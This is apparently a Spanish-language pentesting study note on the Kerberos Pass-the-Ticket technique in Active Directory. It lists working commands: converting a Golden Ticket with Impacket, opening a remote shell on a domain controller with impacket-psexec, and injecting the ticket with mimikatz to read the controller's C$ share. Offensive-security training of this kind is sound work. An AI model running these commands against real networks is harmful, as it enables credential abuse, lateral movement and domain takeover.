# Pass The Ticket 

Tags: #AD #Windows #Persistencia #PassTheTicket 

**Pass-The-Ticket (PTT)** es una técnica avanzada de compromiso de credenciales utilizada en pentesting y ciberseguridad ofensiva. Esta técnica explota vulnerabilidades en la implementación del protocolo de autenticación **Kerberos** en redes Windows, permitiendo a los atacantes utilizar tickets de autenticación (TGT o TGS) previamente obtenidos para acceder a recursos de la red. Con PTT, los atacantes pueden realizar movimientos laterales y acceder a sistemas y servicios sin necesidad de conocer las contraseñas asociadas a los usuarios.

## PTT en Linux

En entornos Linux/Unix, el proceso implica convertir el ticket a un formato compatible (.ccache). Herramientas como `ticketConverter.py` de Impacket son esenciales en este proceso. Una vez convertido, se puede utilizar `kinit` con el archivo .ccache para autenticarse en el entorno Linux/Unix.

```powershell
❯ impacket-ticketConverter evil.tck evil.ccache   # Convertir el archivo del Golden Ticket al formato '.ccache'
❯ export KRB5CCNAME=/home/kali/Desktop/CPAD/evil.ccache  # Exportar la variable de entorno 
❯ klist     # Mirar los tickets 
❯ impacket-psexec -k -no-pass -target-ip 18.191.44.143 -dc-ip 18.191.44.143 first-dc.domain1.corp

	# k = Utiliza la autenticación de Kerberos 
	# target-ip = Es la dirección IP del DC
	# dc-ip = Es la dirección IP del DC

❯ dir \\First-DC.domain1.corp\c$        # Mirar el contenido del directorio en el dominio 
```


## PTT en Windows

```powershell 
❯ mimikatz.exe
	# kerberos::ptt evil.tck           # Este archivo es del Golden ticket llamado 'evil.tck'
	# exit 
❯ klist
❯ dir \\First-DC.domain1.corp\c$        # Mirar el contenido del directorio en el dominio 
```